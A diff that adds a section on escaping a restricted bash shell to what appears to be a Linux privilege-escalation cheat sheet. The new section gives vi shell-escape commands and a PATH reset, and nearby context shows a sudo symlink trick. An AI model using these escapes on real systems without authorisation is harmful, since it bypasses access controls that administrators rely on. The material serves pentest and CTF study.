@@ -189,6 +189,17 @@ sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
 sudo /usr/bin/ln
 
 ```
+### Escaping restricted Shell (rbash)
+
+Using vi editor
+
+```
+: set shell =/bin/sh
+: shell
+```
+Then setting the PATH variable
+
+`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
 
 ### Tar Exploitation
 
